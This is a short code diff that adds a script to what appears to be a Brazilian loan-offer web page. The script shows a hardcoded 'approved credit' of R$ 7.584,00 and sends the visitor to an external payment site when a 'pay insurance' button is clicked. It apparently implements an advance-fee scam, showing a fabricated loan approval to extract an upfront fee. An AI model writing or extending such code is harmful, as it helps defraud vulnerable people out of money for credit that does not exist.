@@ -1730,5 +1730,26 @@
         fbq('track', 'ViewContent');
   
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <!-- Cola o script AQUI, antes de fechar o body -->
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
+  const approvedEl = document.getElementById("approvedAmount");
+  const liberacaoEl = document.getElementById("valorLiberacaoCard");
+
+  if (approvedEl) approvedEl.textContent = "R$ " + valorAprovado;
+  if (liberacaoEl) liberacaoEl.textContent = "R$ " + valorAprovado;
+
+  const btnPayInsurance = document.getElementById("btnPayInsurance");
+  if (btnPayInsurance) {
+    btnPayInsurance.addEventListener("click", () => {
+      btnPayInsurance.disabled = true;
+      const urlParams = new URLSearchParams(window.location.search);
+      urlParams.set("valor", "2993");
+      window.location.href = `https://pay.segurahojes.site/6914b44cfa5673aa56704a65`;
+    });
+  }
+});
+</script>
 
 </body></html>
